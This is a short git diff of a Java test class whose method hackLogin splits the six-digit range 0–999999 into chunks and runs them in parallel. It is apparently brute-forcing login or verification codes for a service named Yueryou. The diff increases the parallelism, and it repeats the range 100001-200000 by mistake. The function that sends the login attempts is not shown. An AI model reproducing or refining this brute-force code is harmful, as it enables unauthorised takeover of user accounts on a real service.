@@ -47,9 +47,18 @@ public class YueryouBizTest {
     private String hackLogin() throws ExecutionException, InterruptedException {
 
         StringBuilder result = new StringBuilder();
-
-        List<String> stepList = Arrays.asList("0-250000", "250001-500000", "500001-750000", "750001-999999");
-//        List<String> stepList = Arrays.asList("0-250000");
+        List<String> stepList = Arrays.asList(
+                "0-100000",
+                "100001-200000",
+                "100001-200000",
+                "200001-300000",
+                "300001-400000",
+                "400001-500000",
+                "500001-600000",
+                "600001-700000",
+                "700001-800000",
+                "800001-900000",
+                "900001-999999");
         List<CompletableFuture<String>> futures = stepList.stream()
                 .map(e -> CompletableFuture.supplyAsync(() ->
                                 loopHackLogin(e),
